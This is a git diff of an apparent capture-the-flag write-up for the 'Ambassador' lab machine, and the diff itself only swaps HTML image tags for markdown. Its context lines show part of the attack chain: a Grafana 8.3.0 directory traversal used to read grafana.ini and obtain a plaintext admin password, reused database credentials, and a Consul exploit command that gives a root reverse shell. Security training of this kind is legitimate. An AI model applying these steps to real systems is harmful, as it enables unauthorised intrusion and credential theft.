@@ -21,7 +21,7 @@ PORT     STATE SERVICE
 
 The only interesting thing here is the mentioning of the user `developer`:
 
-<figure><img src="../../../.gitbook/assets/image (1434).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1434).png>)
 
 Other than that, there was not much here.
 
@@ -29,7 +29,7 @@ Other than that, there was not much here.
 
 Port 3000 was hosting a Grafana instance.
 
-<figure><img src="../../../.gitbook/assets/image (1458).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1458).png>)
 
 This version of Grafana is vulnerable to public exploits:
 
@@ -45,7 +45,7 @@ Grafana 8.3.0 - Directory Traversal and Arbitrary File Rea | multiple/webapps/50
 
 We can confirm that this works:
 
-<figure><img src="../../../.gitbook/assets/image (2790).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2790).png>)
 
 Grafana stores a configuration file at `/etc/grafana/grafana.ini`, so let's start there. We can find some passwords within that:
 
@@ -59,15 +59,15 @@ admin_password = messageInABottle685427
 
 With this, we can login to the admin panel:
 
-<figure><img src="../../../.gitbook/assets/image (3342).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3342).png>)
 
 Within the configuration files, we can find a `mysql.yaml` file.
 
-<figure><img src="../../../.gitbook/assets/image (878).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(878).png>)
 
 We can't edit it, and there wasn't any credentials in it:
 
-<figure><img src="../../../.gitbook/assets/image (2887).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2887).png>)
 
 However, maybe we can use the LFI to read this file on the machine itself.
 
@@ -75,7 +75,7 @@ However, maybe we can use the LFI to read this file on the machine itself.
 
 Based on this documentation, it is located in`/etc/grafana/provisioning/datasources`.
 
-<figure><img src="../../../.gitbook/assets/image (2008).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2008).png>)
 
 Using these creds, we can login to the MySQL database on the machine:
 
@@ -196,4 +196,4 @@ developer@ambassador:~$ python3 exploit_consul.py --rhost 127.0.0.1 --rport 8500
 
 This would give us a reverse shell as `root`.
 
-<figure><img src="../../../.gitbook/assets/image (3192).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3192).png>)
